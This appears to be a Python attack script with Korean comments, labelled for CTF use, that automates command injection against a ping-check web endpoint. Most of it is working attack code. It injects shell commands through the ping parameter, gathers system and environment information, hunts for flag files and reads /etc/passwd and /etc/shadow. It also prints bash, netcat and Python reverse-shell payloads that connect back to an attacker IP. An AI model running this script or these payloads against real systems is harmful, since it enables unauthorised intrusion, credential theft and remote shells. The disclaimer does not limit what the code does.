#!/usr/bin/env python3
"""
Command Injection 자동화 스크립트
CTF 대회용 - 승인된 환경에서만 사용하세요!
"""

import requests
import sys
from urllib.parse import urljoin, quote

class CommandInjectionAttacker:
    def __init__(self, base_url):
        self.base_url = base_url
        self.ping_url = urljoin(base_url, "/checkPing.do")
        self.session = requests.Session()
    
    def test_basic_injection(self):
        """기본 Command Injection 테스트"""
        print("[*] Testing basic command injection...")
        
        payloads = [
            ("ping", "127.0.0.1; whoami"),
            ("ping", "127.0.0.1 && whoami"),
            ("ping", "127.0.0.1 | whoami"),
            ("ping", "127.0.0.1 || whoami"),
            ("check", "whoami"),
            ("check", "id"),
        ]
        
        for param, payload in payloads:
            print(f"[+] Trying: {param}={payload}")
            
            params = {param: payload}
            
            try:
                response = self.session.get(self.ping_url, params=params, timeout=10)
                
                if any(keyword in response.text.lower() for keyword in ["root", "uid=", "gid=", "www-data", "tomcat"]):
                    print(f"[SUCCESS] Command executed: {payload}")
                    print(f"[OUTPUT] {response.text[:200]}")
                    return True
            except Exception as e:
                print(f"[-] Error: {e}")
        
        print("[-] Basic injection failed")
        return False
    
    def execute_command(self, command, param="ping"):
        """특정 명령어 실행"""
        if param == "ping":
            payload = f"127.0.0.1; {command}"
        else:
            payload = command
        
        params = {param: payload}
        
        try:
            response = self.session.get(self.ping_url, params=params, timeout=10)
            return response.text
        except Exception as e:
            return f"Error: {e}"
    
    def find_flags(self):
        """플래그 파일 찾기"""
        print("\n[*] Searching for flag files...")
        
        commands = [
            "find / -name '*flag*' 2>/dev/null",
            "find /tmp -name '*flag*' 2>/dev/null",
            "find /home -name '*flag*' 2>/dev/null",
            "grep -r 'FLAG{' /tmp/ 2>/dev/null",
            "cat /tmp/flag.txt",
            "cat /tmp/flag*.txt",
            "ls -la /tmp/ | grep flag",
        ]
        
        for cmd in commands:
            print(f"[+] Executing: {cmd}")
            result = self.execute_command(cmd)
            
            if "FLAG{" in result:
                print(f"[SUCCESS] Flag found!")
                import re
                flags = re.findall(r'FLAG\{[^}]+\}', result)
                for flag in flags:
                    print(f"    {flag}")
                return flags
            elif result and "Error" not in result and len(result) > 10:
                print(f"[INFO] Output: {result[:200]}")
        
        print("[-] No flags found")
        return []
    
    def system_recon(self):
        """시스템 정보 수집"""
        print("\n[*] Gathering system information...")
        
        recon_commands = {
            "Hostname": "hostname",
            "Current User": "whoami",
            "User ID": "id",
            "OS Info": "uname -a",
            "Current Directory": "pwd",
            "Environment": "env | head -10",
            "Network": "ifconfig || ip addr",
            "Processes": "ps aux | head -10",
        }
        
        results = {}
        
        for name, cmd in recon_commands.items():
            print(f"[+] {name}...")
            result = self.execute_command(cmd)
            
            if result and "Error" not in result:
                results[name] = result[:200]
                print(f"    {result[:100]}")
        
        return results
    
    def read_sensitive_files(self):
        """민감한 파일 읽기"""
        print("\n[*] Attempting to read sensitive files...")
        
        files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/version",
            "/proc/cpuinfo",
        ]
        
        for file_path in files:
            print(f"[+] Reading: {file_path}")
            result = self.execute_command(f"cat {file_path}")
            
            if result and "Error" not in result and len(result) > 10:
                print(f"[SUCCESS] {file_path} content (first 200 chars):")
                print(f"    {result[:200]}")
    
    def reverse_shell_payload(self, attacker_ip, attacker_port):
        """리버스 쉘 페이로드 생성 (실행하지 않음, 출력만)"""
        print("\n[*] Reverse shell payloads (for reference):")
        
        payloads = {
            "Bash": f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
            "Netcat": f"nc {attacker_ip} {attacker_port} -e /bin/bash",
            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        }
        
        for name, payload in payloads.items():
            print(f"\n{name}:")
            print(f"  ping=127.0.0.1; {payload}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python command_injection.py <target_url> [attacker_ip] [attacker_port]")
        print("Example: python command_injection.py http://localhost:8080")
        print("Example: python command_injection.py http://localhost:8080 10.0.0.1 4444")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker_ip = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.1"
    attacker_port = sys.argv[3] if len(sys.argv) > 3 else "4444"
    
    print("=" * 60)
    print("Command Injection Attack Script")
    print("Target:", target)
    print("=" * 60)
    
    attacker = CommandInjectionAttacker(target)
    
    # 1. 기본 injection 테스트
    if attacker.test_basic_injection():
        print("\n[+] Command injection is possible!")
        
        # 2. 시스템 정보 수집
        attacker.system_recon()
        
        # 3. 플래그 찾기
        flags = attacker.find_flags()
        
        # 4. 민감한 파일 읽기
        attacker.read_sensitive_files()
        
        # 5. 리버스 쉘 페이로드 출력
        attacker.reverse_shell_payload(attacker_ip, attacker_port)
    else:
        print("\n[-] Command injection not detected")
    
    print("\n" + "=" * 60)
    print("Attack completed!")
    print("=" * 60)

if __name__ == "__main__":
    main()
